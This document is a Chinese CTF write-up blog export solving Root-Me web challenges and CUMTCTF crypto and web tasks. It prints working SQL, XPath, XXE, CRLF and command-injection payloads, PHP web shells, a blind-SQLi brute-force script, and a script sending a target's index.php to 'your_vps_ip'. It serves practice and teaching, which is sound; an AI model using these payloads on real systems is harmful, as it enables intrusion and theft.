`admin.php.............[4096]............` 来实现相同的效果\n\n> 当然，我们必须记住，它只能在小于5.3的版本中使用。\n为了弥补这一缺陷，只需将其PHP更新为5.3。\n\n****************************\n\n回到本题\n\n![payload](rootme1/9.png)\n\n## PHP Serialization\n\n网站可以查看源码\n\n```php\n<?php\ndefine('INCLUDEOK', true);\nsession_start();\nif(isset($_GET['showsource'])){\n    show_source(__FILE__);\n    die;\n}\n/******** AUTHENTICATION *******/\n// login / passwords in a PHP array (sha256 for passwords) !\nrequire_once('./passwd.inc.php');\nif(!isset($_SESSION['login']) || !$_SESSION['login']) {\n    $_SESSION['login'] = \"\";\n    // form posted ?\n    if($_POST['login'] && $_POST['password']){\n        $data['login'] = $_POST['login'];\n        $data['password'] = hash('sha256', $_POST['password']);\n    }\n    // autologin cookie ?\n    else if($_COOKIE['autologin']){\n        $data = unserialize($_COOKIE['autologin']);\n        $autologin = \"autologin\";\n    }\n    // check password !\n    if ($data['password'] == $auth[ $data['login'] ] ) {\n        $_SESSION['login'] = $data['login'];\n\n        // set cookie for autologin if requested\n        if($_POST['autologin'] === \"1\"){\n            setcookie('autologin', serialize($data));\n        }\n    }\n    else {\n        // error message\n        $message = \"Error : $autologin authentication failed !\";\n    }\n}\n/*********************************/\n?>\n...\n<?php\n// message ?\nif(!empty($message))\n    echo \"<p><em>$message</em></p>\";\n// admin ?\nif($_SESSION['login'] === \"superadmin\"){\n    require_once('admin.inc.php');\n}\n// user ?\nelseif (isset($_SESSION['login']) && $_SESSION['login'] !== \"\"){\n    require_once('user.inc.php');\n}\n```\n\n由这段代码可知\n\n```php\nif($_SESSION['login'] === \"superadmin\"){\n    require_once('admin.inc.php');\n}\n```\n必须以superadmin登录，才可以获得flag\n\n关键逻辑如下\n\n```php\nif(!isset($_SESSION['login']) || !$_SESSION['login']) {\n    $_SESSION['login'] = \"\";\n    // form posted ?\n    if($_POST['login'] && $_POST['password']){\n        $data['login'] = $_POST['login'];\n        $data['password'] = hash('sha256', $_POST['password']);\n    }\n    // autologin cookie ?\n    else if($_COOKIE['autologin']){\n        $data = unserialize($_COOKIE['autologin']);\n        $autologin = \"autologin\";\n    }\n    // check password !\n    if ($data['password'] == $auth[ $data['login'] ] ) {\n        $_SESSION['login'] = $data['login'];\n\n        // set cookie for autologin if requested\n        if($_POST['autologin'] === \"1\"){\n            setcookie('autologin', serialize($data));\n        }\n    }\n    else {\n        // error message\n        $message = \"Error : $autologin authentication failed !\";\n    }\n}\n```\n\n如果我们***没有POST用户名和密码***的话，题目就会通过反序列化获取cookie里面的用户信息，而在验证逻辑中使用了 `==` ，这就看到了漏洞点，因为在PHP中， 字符串与布尔真进行 `==` 是会判断为真的，例如 `'afdsfaf'==True` 是会判断成立的，所以在验证密码时，我们可以使我们的密码为布尔True，那么与密码字符串判断则会返回True，从而绕过验证。\n\n```php\n<?php\n$data[\"login\"] = \"superadmin\";\n$data[\"password\"] = True;\necho urlencode(serialize($data));\n?>\n```\n\n然后抓包修改请求即可\n\n![payload](rootme1/7.png)\n\n发送就可以收到结果啦\n\n![result](rootme1/8.png)\n\n## SQL injection - numeric\n\n数字型注入，打开页面后点击信息，注入点在news_id上，直接注入即可，不需要单引号闭合，用 `--+` 作为注释\n\n```\n-1 union select 1,name,3 from sqlite_master--+\n```\n\n具体步骤不再细说，用sqlmap更快\n\n## SQL Injection - Routed\n\n这道题目知识点叫路由注入，我觉得也相当于二次注入，我们第一次提交的内容会被执行SQL查询操作，执行结果不回显而是被代入第二个SQL语句中，然后题目在最终回显第二次查询的内容。\n\n题目有个介绍相关知识点的网址 [Click Here!](http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html)，给出了实例代码\n\n```php\n<?\n$id=$_GET['id'];\n$query=\"SELECT id,sec_code FROM users WHERE id='$id'\";\nif (!$result=mysql_query($query,$conn))  \n\tdie(\"Error While Selection process : \" . mysql_error());\nif(mysql_num_rows($result) == 0)\t\t\n\tdie();\n$row = mysql_fetch_array($result, MYSQL_ASSOC);\n$query=\"SELECT username FROM users WHERE sec_code='\".$row['sec_code'].\"'\";\necho \"<br><font color=red>This is the query which gives you Output : </font>$query<br><br>\";\nif (!$result=mysql_query($query,$conn))  \n\tdie(\"Error While Selection process : \" . mysql_error());\nif(mysql_num_rows($result) == 0)\t\t\n\tdie(\"Invalid Input parameter\");\n$row = mysql_fetch_array($result, MYSQL_ASSOC);\t\t\necho 'Username is : ' . $row['username'] . \"<br>\";\n?>\n```\n\n绕过的payload如下\n\n```\nhttp://leettime.net/sqlninja.com/tasks/routed_sqli_1.php?id=1' and false union select 1,0x2720756e696f6e2073656c65637420312c3223--+\n```\n\n相当于第一次查询的第二个元素在第二次查询中执行并且回显\n\n----------------------------------\n\n回到本题\n\n题目中逗号，括号等都被过滤了，当我们使用union查询时，由于无法使用逗号，故只能返回第一个内容，然后利用我们前面的知识点，题目应该是取第一次查询的结果到第二次中查询，那么我们可以考虑在第一次查询中注入SQL语句，由于双引号被过滤，可以使用十六进制编码，此处为直观起见，只给出SQL语句\n\n```sql\nlogin=' union select \"'order by 2-- -\"%23\n```\n\n`-- -` 是为了注释第二次查询的SQL语句\n题目返回正常回显，经过测试发现列数为2，接下来测试\n\n```sql\n\"'union select 1,2 -- -\"\n```\n\n返回1和2\n\n题目到此基本上就出来了，剩下的就是常规注入了，大家自己动手即可。\n\n## SQL Truncation\n\nSQL截断攻击，这个很简单，就不多说了，直接注册一个`admin                                                             123`的用户，由于用户名长度超出了数据类型长度的限制而被截断，于是只剩下了`admin` 被存入数据库中，那么我们就可以用这个用户的密码以admin的身份登录了\n\n## XML External Entity\n\nXXE（外部实体注入），题目可以远程引入rss文件，而rss文件是符合xml规范的，这题我们需要注意的是我们引入的xml文件必须要符合rss标准，否则会解析错误，在自己的vps上写入文件\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE root [<!ENTITY  file1 SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]>\n<rss xmlns:slash=\"http://purl.org/rss/1.0/modules/slash/\" version=\"2.0\">\n\t<channel>\n\t\t<item>\n\t\t\t<title>&file1;</title>\n\t\t</item>\n\t</channel>\n</rss>\n```\n\n然后在RSS Validity Checker页面提交 `http://your_vps_ip/exp.xml` ，然后就可以收到PHP文件内容了。\n\n## XPath injection - authentication\n\nXpath注入，Xpath是用于在XML中选取相应数据的语言，XML相当于数据库的话，xpath相当于sql查询语言，可以查看这篇文章 [https://blog.csdn.net/quiet_girl/article/details/50588130](https://blog.csdn.net/quiet_girl/article/details/50588130)，当我使用了它提供的这种基本思路 `username=John&password=' or ''='' or ''='` 可以登录，但是由于匹配到了所有的用户，但是题目值只回显第一个普通用户，这无法使我们以administrator身份登录，所以我们需要尝试其他的思路， 我们有members页面知道administrator权限的用户名为John，那么我们可以尝试将password验证闭合掉只验证用户名，那我们不就可以登录任意用户名了，我们构造一下即可\n\n```\nusername=John' and (''='' or ''='&password=') and ''='\n```\n\n题目后端执行的语句可能是\n\n```\n//users/user[loginID/text()='xyz'and password/text()='123test']\n```\n\n```\n//users/user[loginID/text()='John' and (''='' or ''='' and password/text()='') and ''='']\n```\n\n我们可以看到password验证被成功闭合为字符串了比较了。\n\n## SQL injection - Error\n\n上sqlmap即可\n\n```\npython sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc\" -p order --threads=10 --dbs\n```\n\n是一个postgresql数据库的相关注入\n\n##  SQL injection - blind\n\n本题是SQL盲注，很常规，所以直接给脚本了\n\n```python\nimport requests\n\nurl = \"http://challenge01.root-me.org/web-serveur/ch10/\"\nchars = \"qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM@%&?\"\nflag = ''\nfor i in range(40):\n\tfor item in chars:\n\t\tcontent = requests.post(url,data={'username':\"admin' and password glob '{}*'--+\".format(flag + item), 'password':\"123\"}).text\n\t\tif \"master\" in content:\n\t\t\tflag += item\n\t\t\tprint(flag)\n\t\t\tbreak\n```\n\n## SQL injection - file reading\n\n在members界面的id参数存在数字型注入， 可以得到数据库信息\n\n```bash\npython sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1\" -p id --threads=10 -D c_webserveur_31 --dump-all\n```\n\n![content](rootme1/10.png)\n\n但是这个密码没有用，题目说了需要文件读取，故尝试读取index.php文件\n\n```\n http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=-1 union select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4-- +\n```\n\n> 16进制值的含义为*/challenge/web-serveur/ch31/index.php*\n\n之后可以看到密码的相关的代码\n\n```php\nif($pass == stringxor($key, base64_decode($data['member_password']))){\n                                // authentication success\n                                print \"<p>Authentication success !!</p>\";\n                                if ($user == \"admin\")\n                                    print \"<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>\";\n                                else \n                                    print \"<p>But... you're not admin !</p>\";\n}\n```\n\n$key,stringxor在前面的代码中都有，所以我们按照它的逻辑求解一下即可\n\n```php\n<?php\nfunction stringxor($o1, $o2) {\n    $res = '';\n    for($i=0;$i<strlen($o1);$i++)\n        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        \n    return $res;\n}\n$key = \"c92fcd618967933ac463feb85ba00d5a7ae52842\";\n$a = stringxor($key, base64_decode('VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=='));\necho $a;\n ?>\n```\n\n可得到前文的$pass的值为 `77be4fc97f77f5f48308942bb6e32aacabed9cef` ，但是$pass的值也是经过处理的\n\n```php\n$pass = sha1($_POST['password']);\n```\n\n找一个可以解sha1密码的网站在线解密一下即可，最后明文密码为 `superpassword` 。\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"Rootme网站做题记录(一)","url":"/2019/07/31/rootme/","content":"\n\n# 前言\n\n最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。\n\n<!--more-->\n\n# Web-Server\n\n## HTML\n\n签到题，查看元素即可。\n\n## HTTP-Open redirect\n\n查看提示可知，题目要求我们能够重定向网页到另一个网址，可以尝试抓包看一下，发现发起的请求如下\n\n> GET /web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134 HTTP/1.1\n\n那么我们可以尝试修改url实现重定向，但是不对，猜测h字段应该也要相应变化，感觉这个h字段像是一段hash值，测试了一下发现前面url的值的MD5\n的值正好是后面h字段的值，于是此题就解出来了，payload如下(用bp发送比较好)\n\n```\n?url=http://qq.com&h=fb992d62fc0302ccc9da03fe80fb1d42\n```\n\n## Command injection\n\n题目其实不难，我想复杂了，想着要反弹shell，结果没成功，还是我对命令注入理解太少了，没什么很难的点，直接上payload\n\n```bash\nip=127.0.0.1;more index.php\n```\n\n也可以用cat命令，然后查看元素即可\n\n## Weak password\n\n弱口令，用户名和密码均为admin\n\n## User-agent\n\n看标题应该和user-agent字段有关，访问题目可得\n\n> Wrong user-agent: you are not the \"admin\" browser!\n\n所以我们直接修改user-agent字段为admin然后即可hack\n\n## Backup file\n\n题目存在备份文件泄露漏洞，泄露的文件为 `index.php~` ，下载之后即可得flag\n\n## HTTP - POST\n\n抓包绕过前端js，修改score值在发包即可\n\n## HTTP directory indexing\n\n打开题目查看元素， `include(\"admin/pass.html\")` ，打开题目之后却说这是逗我玩的，之后尝试访问admin，可以访问，接着依次访问 `backup/admin.txt` 即可得到flag\n\n## HTTP Headers\n\n应该是修改请求头，抓包看一下发现有个字段 `Header-RootMe-Admin: none` ，尝试着把它的值改为true，再次发起请求即可得到flag\n\n## HTTP verb tampering\n\n这个题没有理解题目的意思，标题的中文意思是 **http动作篡改** ，不知道这个题目要什么，查阅资料后才知道这个题目是要求我们改变我们发起请求的方法，猜测题目应该存在某种逻辑错误导致可以用过更换请求方式来实现绕过，本来可以用curl命令来发起请求，但是我试了没有成功，所以我写了个简单的代码实现它\n\n```python\nimport requests\n\nurl = 'http://challenge01.root-me.org/web-serveur/ch8/'\ncontent = requests.put(url).content\nprint(content)\n```\n\n## Install files\n\n我并没有理解这道题的意义在哪，题目提示 `you know phpbb` ，又提到install file，直接google一下 `phpbb install file` 即可得到phpbb系统的安装包位置，访问即可获得flag\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php\n```\n\n## Improper redirect\n\n直接抓包修改login.php为index.php即可\n\n![](rootme/1.png)\n\n## CRLF\n\n********************\n\n首先了解一波CRLF\n\n> CRLF是“回车+换行”（\\\\r\\\\n）的简称，在HTTP协议中，，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。\n\n我的理解就是该种攻击方式能够在HTTP头部注入HTML代码，从而达到html代码注入的目的\n\n*0X01*\n\n对于HRS最简单的利用方式是注入两个\\r\\n，之后在写入XSS代码，来构造一个xss\n\n比如某个网站接受的参数为 http://test.sina.com.cn/?url=xxx ，xxx放在Location后面作为一个跳转。如果我们输出的是\n\n```\nurl=%0d%0a%0d%0a<img src=1 onerror=alert(/xxx/)>\n```\n\n那么返回的包就会是\n\n> HTTP/1.1 302 Moved Temporarily \nDate: Fri, 27 Jun 2014 17:52:17 GMT \nContent-Type: text/html \nContent-Length: 154 \nConnection: close \nLocation:\n&lt;img src=1 onerror=alert(/xxx/)>\n\n所以就实现了xxs的构造\n\nHRS输入是无视浏览器Filter的，浏览器Filter是一些浏览器应对XSS的保护策略，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter，所以我们可以考虑通过HRS将 `X-XSS-Protection:0` 注入到HTTP头部中，在利用两个CRLF注入xss代码从而可以实现xss漏洞\n\n[参考链接](https://blog.csdn.net/think_ycx/article/details/50267801)\n\n*************\n\n题目给出了提示\n\n> Inject false data in the journalisation log.\n\n但是我并不知道究竟怎么样才算是一个false data，不知道这个题目用CRLF怎么来玩，看了别人的wp思路后，可以构造出payload\n\n```\nGET /web-serveur/ch14/?username=guest authenticated.%0d%0aguest&password=12456 HTTP/1.1\n```\n\n刚开始我不懂为什么这样做的原因，但是我看到提交一次请求，日志中更新了两条信息\n\n> guest authenticated.\nguest failed to authenticate.\n\n是不是因为一次更新了两条信息从而满足了false data的条件呢？我尝试了其他payload，例如\n\n```\nGET /web-serveur/ch14/?username=admin authenticated.%0d%0Aadmin&password=12456 HTTP/1.1\n```\n\n也是可以的，但是当第一条记录是失败记录时则无法得到flag。总之这题的原理还是不很清楚。\n\n## File upload - double extensions\n\n文件上传。题目要求读根目录下的.passwd文件，题目给出了提示 `double extensions（双后缀）` ，基本可以知道这个上传是双后缀名绕过，本地写一个PHP文件\n\n```php\n<?php  \n$content = shell_exec($_GET['snow']);\necho $content;\n?>\n```\n\n保存，修改后缀名为 `.php.jpg` 然后上传即可获得文件路径，发起如下GET请求\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch20/galerie/upload/lngij69s7er2fa7oupcg6nold6/1.php.jpg?snow=ls ../../../ -a\n```\n\n依次向父目录跳转，直到看到.passwd文件，读文件\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch20/galerie/upload/lngij69s7er2fa7oupcg6nold6/1.php.jpg?snow=cat ../../../.passwd\n```\n\n## File upload - MIME type\n\n看题目提示直接修改文件类型即可，不需要更改后缀，创建一个PHP文件\n\n```php\n<?php system($_GET['snow'])?>\n```\n\n提交，抓包修改一下\n\n![](rootme/2.png)\n\n## HTTP cookies\n\n考察修改cookie的基本知识，修改cookie值为admin即可\n\n## Directory traversal\n\n可以尝试随便点一下，看到URL变化了\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=devices\n```\n\n猜测 `?galerie=devices` 中的devices应该是目录名，所以我们可以尝试一下 \n\n```\nhttp://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./\n```\n\n看到确实多出来一个区块\n\n![](rootme/3.png)\n\n无法直接点击，查看元素\n\n![](rootme/4.png)\n\n按照路径访问\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=.//86hwnX2r\n```\n\n可以看到有password区块，查看元素可以看到路径\n\n![](rootme/5.png)\n\n但是用get请求无法访问，要用路径名访问才可以，最终payload\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch15/galerie//86hwnX2r/password.txt\n```\n\n## File upload - null byte\n\n考察%00截断，新建PHP文件，改后缀名为 `filename.php%00.jpg` 上传并访问即可获得flag\n\n## PHP assert()\n\n这题涨姿势了，应该考察的是函数闭合的问题，先尝试随便输入一下，没什么反应，尝试输入非法内容诱使报错\n\n![](rootme/6.png)\n\n可以推测报错对应代码应该是 `assert(strpos('includes/home.php', '..') === false);` ，那么我们是否可以尝试向SQL注入一样闭合括号呢？由报错信息可以看到我们可控的输入内容是 `home` 这个位置，那么我们尝试闭合一下\n\n```php\na','..') === false and strpos('s\n```\n\n拼接到上述代码中\n\n```php\nassert(strpos('includes/a','..') === false and strpos('s.php', '..') === false);\n```\n\n如此代码成功闭合，那么我们只需要构造代码读取 .passwd 文件的内容即可，最终payload\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch47/?page=home','..') === false and $flag=fopen('.passwd','r') and print(fread($flag,filesize('.passwd'))) and strpos('home\n```\n\n## PHP filters\n\n考察PHP://filter的应用\n\n尝试读取文件\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=login.php\n```\n\nbase64解码得到源代码\n\n```php\n<?php\ninclude(\"config.php\");\n\nif ( isset($_POST[\"username\"]) && isset($_POST[\"password\"]) ){\n    if ($_POST[\"username\"]==$username && $_POST[\"password\"]==$password){\n      print(\"<h2>Welcome back !</h2>\");\n      print(\"To validate the challenge use this password<br/><br/>\");\n    } else {\n      print(\"<h3>Error : no such user/password</h2><br />\");\n    }\n} else {\n?>\n<form action=\"\" method=\"post\">\n  Login&nbsp;<br/>\n  <input type=\"text\" name=\"username\" /><br/><br/>\n  Password&nbsp;<br/>\n  <input type=\"password\" name=\"password\" /><br/><br/>\n  <br/><br/>\n  <input type=\"submit\" value=\"connect\" /><br/><br/>\n</form>\n<?php } ?>\n```\n\n再访问config.php\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php\n```\n\n解码即可得到flag\n\n## PHP register globals\n\n查看提示\n\n> It seems that the developper often leaves backup files around...\n\n可能存在备份文件泄露，尝试发现存在 `index.php.bak` ，访问之后下载文件，代码如下\n\n```php\n<?php\nfunction auth($password, $hidden_password){\n    $res=0;\n    if (isset($password) && $password!=\"\"){\n        if ( $password == $hidden_password ){\n            $res=1;\n        }\n    }\n    $_SESSION[\"logged\"]=$res;\n    return $res;\n}\nfunction display($res){\n    $aff= '\n\t  <html>\n\t  <head>\n\t  </head>\n\t  <body>\n\t    <h1>Authentication v 0.05</h1>\n\t    <form action=\"\" method=\"POST\">\n\t      Password&nbsp;<br/>\n\t      <input type=\"password\" name=\"password\" /><br/><br/>\n\t      <br/><br/>\n\t      <input type=\"submit\" value=\"connect\" /><br/><br/>\n\t    </form>\n\t    <h3>'.htmlentities($res).'</h3>\n\t  </body>\n\t  </html>';\n    return $aff;\n}\nsession_start();\nif ( ! isset($_SESSION[\"logged\"]) )\n    $_SESSION[\"logged\"]=0;\n\n$aff=\"\";\ninclude(\"config.inc.php\");\n\nif (isset($_POST[\"password\"]))\n    $password = $_POST[\"password\"];\n\nif (!ini_get('register_globals')) {\n    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);\n    if (isset($_SESSION)) {\n        array_unshift($superglobals, $_SESSION);\n    }\n    foreach ($superglobals as $superglobal) {\n        extract($superglobal, 0 );\n    }\n}\nif (( isset ($password) && $password!=\"\" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION[\"logged\"]==1 ) ){\n    $aff=display(\"well done, you can validate with the password : $hidden_password\");\n} else {\n    $aff=display(\"try again\");\n}\necho $aff;\n?>\n\n```\n\n关键逻辑为\n\n```php\nif (( isset ($password) && $password!=\"\" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION[\"logged\"]==1 ) ){\n    $aff=display(\"well done, you can validate with the password : $hidden_password\");\n} else {\n    $aff=display(\"try again\");\n}\n```\n\n可知我们得到flag有两种方法\n\n* 输入的password和系统的passwd相同\n* 使session中的logged值为1\n\n前者显然不可能，因为我们并不知道密码是什么，对于后者看标题可知，服务器应该配置了 `register globals` 为 on，这样的话各种变量都被注入代码，例如来自 HTML 表单的请求变量，所以我们可以以GET方法直接请求变量名\n\npayload\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch17/index.php?_SESSION[logged]=1\n```\n\n需要注意的是，官方文档中提到\n\n> 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。\n\n在较高版本中该漏洞不存在\n\nPS：这道题目的flag并不是很长而且没有特殊字符，所以理论上应该还存在密码爆破的可能\n\n## File upload - ZIP\n\n题目要求我们读取网站的index.php文件，尝试上传zip文件，网站会自动将我们的zip文件解压并返回文件位置，我们可以读取文件（网站只能够解析TXT文件和图片文件），这显然无法实现我们的目标，我们始终只能够读取我们上传的文本文件或者图片，我们应该试图寻找一种方法能够在文本文件中实现跨文件读取，从而读取目标文件，找了很久的资料，找到了一种方法：**建立symlink（符号索引）** ，类似于windows环境下的快捷方式\n\n> 符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，也可以链接不同文件系统的文件。甚至可以链接不存在的文件，这就产生一般称为“断裂”的问题（现象），还可以不断的循环链接自己。\n用ln -s 命令可以生成一个符号链接，如下所示：\n```bash\nln -s source_file  softlink_file\n```\n> 在对符号链接进行读写操作的时候，系统会自动把该操作转换为对源文件的操作。但是删除链接文件时，系统仅仅删除符号链接文件，而不删除源文件本身。\n\n那么我们可以尝试建立符号链接\n\n```bash\nln -s ../../../index.php index\n```\n\n然后目录下会出现一个index的符号链接，压缩为zip文件\n\n```bash\nzip -y index.zip index\n```\n\n然后提交即可读到目标文件，得到flag。\n\n## Command injection - Filter bypass\n\n命令执行，用分号不可以了，被过滤了，而且题目不返回执行后的内容，只返回 `Ping OK` 或者 `Syntax Error` 等状态信息，尝试 `%0a` 绕过，得到正常回显，后面还发现 `|,&` 等也被过滤了，可以尝试反向shell，本来尝试简单的bashshell，但是无法得到稳定的shell，百度了一下资料，找到了一个方法，本题可以使用curl等命令，我们可以尝试在本机上新建一个PHP文件，该文件的功能是读取index.php并发送到指定的主机上；然后执行命令让靶机下载并执行这个文件从而可以在我们的主机上读取到index.php的文件内容。\n\n具体步骤如下：\n\n- 1.在自己的vps上新建一个 **flag.txt** ，不写入任何内容。\n\n```bash\nvi flag.txt\n```\n\n- 2.在本地主机上新建一个 **getdata.php** 文件，写入内容如下\n\n```php\n$txt=$_GET['c'];\n$myfile = fopen(\"flag.txt\", \"a\") or die(\"Unable to open file!\");\nfwrite($myfile, \"\\r\\n\");\nfwrite($myfile, $txt);\nfclose($myfile);\necho \"ok\";\n```\n\n- 3.在本地主机上新建一个**sendrequest.txt**文件，写入如下内容\n\n```php\n<?php\n$cSession = curl_init();\n$content = bin2hex(file_get_contents('index.php'));\ncurl_setopt($cSession,CURLOPT_URL,\"http://your_vps_ip/getdata.php?c=\".$content);\ncurl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);\ncurl_setopt($cSession,CURLOPT_HEADER,false);\n$result = curl_exec($cSession);\ncurl_close($cSession);\necho $result;\n?>\n```\n\n- 4.向靶机发送请求\n\n![](rootme/7.png)\n\n- 5.之后在本机上读取flag.txt文件的内容再解码为字符串即可\n\n```php\n<?php \n$flag = \"************************************\";\nif(isset($_POST[\"ip\"]) && !empty($_POST[\"ip\"])){\n        $ip = @preg_replace(\"/[\\\\\\$|`;&<>]/\", \"\", $_POST[\"ip\"]);\n        $response = @shell_exec(\"timeout 5 bash -c 'ping -c 3 \".$ip.\"'\");\n        $receive = @preg_match(\"/3 packets transmitted, (.*) received/s\",$response,$out);\n\n        if ($out[1]==\"3\") \n        {\n                echo \"Ping OK\";\n        }\n        elseif ($out[1]==\"0\")\n        {\n                echo \"Ping NOK\";\n        }\n        else\n        {\n                echo \"Syntax Error\";\n        }\n}\n?>\n```\n\nPS：本题我折腾了好久，原因在于我的web服务老是配置错误无法执行PHP文件，还有文件权限配置错误，这两点需要注意。\n\n## Local File Inclusion\n\n本地文件包含漏洞的利用，可以先试一下文件遍历\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch16/?files=../\n```\n\n发现有admin文件，访问\n\n```\nhttp://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php\n```\n\n找一下即可得到flag\n\n## Local File Inclusion - Double encoding\n\n漏洞点：url二次编码绕过，本题中 `. /` 等分界符被过滤了，所以可以尝试二次编码绕过 \n\n百度url编码即可查到各个字符的url编码\n\n我最开始尝试的是目录跳转，可是没有什么进展，题目返回报错信息\n\n![](rootme/8.png)\n\n看到有个包含的文件后缀是必须是.inc.php，所以尝试获取PHP的配置文件试试看 `conf.inc.php`，用PHP的filter协议\n\n```\nphp://filter/read=convert.base64-encode/resource=conf\n```\n\n然后url编码两次提交再解码即可得到flag。\n\n## PHP - Loose Comparison\n\n本题是一道很基础的PHP弱比较问题，但是这题的代码很长，有点吓到我了，导致我很久都没搞清楚这题的考点，代码如下\n\n```php\n<?php\nfunction gen_secured_random() { // cause random is the way\n    $a = rand(1337,2600)*42;\n    $b = rand(1879,1955)*42;\n    $a < $b ? $a ^= $b ^= $a ^= $b : $a = $b;\n    return $a+$b;\n}\nfunction secured_hash_function($plain) { // cause md5 is the best hash ever\n    $secured_plain = sanitize_user_input($plain);\n    return md5($secured_plain);\n}\nfunction sanitize_user_input($input) { // cause someone told me to never trust user input\n    $re = '/[^a-zA-Z0-9]/';\n    $secured_input = preg_replace($re, \"\", $input);\n    return $secured_input;\n}\nif (isset($_GET['source'])) {\n    show_source(__FILE__);\n    die();\n}\nrequire_once \"secret.php\";\nif (isset($_POST['s']) && isset($_POST['h'])) {\n    $s = sanitize_user_input($_POST['s']);\n    $h = secured_hash_function($_POST['h']);\n    $r = gen_secured_random();\n    if($s != false && $h != false) {\n        if($s.$r == $h) {\n            print \"Well done! Here is your flag: \".$flag;\n        }\n        else {\n            print \"Fail...\";\n        }\n    }\n    else {\n        print \"<p>Hum ...</p>\";\n    }\n}\n?>\n```\n\n关键逻辑如下\n\n```php\nif (isset($_POST['s']) && isset($_POST['h'])) {\n    $s = sanitize_user_input($_POST['s']);\n    $h = secured_hash_function($_POST['h']);\n    $r = gen_secured_random();\n    if($s != false && $h != false) {\n        if($s.$r == $h) {\n            print \"Well done! Here is your flag: \".$flag;\n        }\n```\n\n首先提交参数s和t，然后对于s执行验证，控制只能输入英文字符和数字；对于h，也是先验证输入合法性，然后返回提交的字符串md5值，$r变量是一串随机数，最后r拼接在s后面与h的md5值进行 `==` 比较，此处出现漏洞，那么我们可以令s为 `0e` 开头的字符串，h为hash值是0e开头的字符串从而绕过验证\n\n![payload](rootme/11.png)\n\n## PHP preg_replace()\n\n题目是一个界面，让我们提交preg_replace()函数需要的参数从而返回相应的结果，查阅官方文档发现如下资料\n\n![正则匹配修饰符e](rootme/9.png)\n\n根据官方文档可以知道，当我们使用使用了e参数后，我们的匹配内容会被当做PHP代码执行，于是我们可以利用这个特性读取flag.php文件\n\n![payload](rootme/10.png)\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"CUMTCTF第三轮月赛与决赛","url":"/2019/05/22/cumtctf3/","content":"\n# 第三次双月赛题解\n\n<!-- more -->\n\n## Crypto\n\n### 古典密码签到\n\n维吉尼亚密码，密文`juttaigykhpmjyreca`，秘钥`cumt`，在线解密即可[https://www.qqxiuzi.cn/bianma/weijiniyamima.php](https://www.qqxiuzi.cn/bianma/weijiniyamima.php)\n\nflag: `flag{hahayoufindtheflag}`\n\n### encode\n\n题目给出的pyc文件，在线反编译一下即可得到源代码\n\n很简单的解密题，按照相反的逻辑解密即可\n\n```python\n#!/usr/bin/env python\n# encoding: utf-8\nimport base64\n\ndef encode1(ans):\n    s = ''\n    for i in ans:\n        x = ord(i) ^ 36\n        x = x + 25\n        s += chr(x)\n    \n    return s\n\ndef encode2(ans):\n    s = ''\n    for i in ans:\n        x = ord(i) + 36\n        x = x ^ 36\n        s += chr(x)\n    \n    return s\n\ndef encode3(ans):\n    return base64.b32encode(ans)\n\nflag = ' '\nfinal = 'LOQ2NJFYU5YH2WTUU5VHJIDXLJNVW2LQO52WS2L6PVUVW2TQLJNVSWLJUBN3E==='\n# if encode3(encode2(encode1(flag))) == final:\n#     print 'correct'\n# else:\n#     print 'wrong'\n\ndef decode3(ans):\n    return base64.b32decode(ans)\n\ndef decode2(ans):\n    s = ''\n    for i in ans:\n        x = ord(i)\n        x = x ^ 36\n        x = x - 36\n        s += chr(x)\n    return s\n\ndef decode1(ans):\n    s = ''\n    for i in ans:\n        x = ord(i)\n        x = x - 25\n        x = x ^ 36\n        s += chr(x)\n    return s\n    \nprint decode1(decode2(decode3(final)))\n```\n\n```\nflag{b38e7b57c2eff432044984f53efdd4cf}\n```\n\n## web\n\n### web签到1\n\n简单的文件包含即可\n\n```\nhttp://202.119.201.199:30100/?page=php://filter/read=convert.base64-encode/resource=cxk.php\n```\n\nflag{CumtCTF_this_iS_a_RElLy_fLaG!!!}\n\n### Web签到2\n\n```php\nclass P {\n    private $var;\n    \n    function __invoke(){\n        eval(\n            'global '.$this 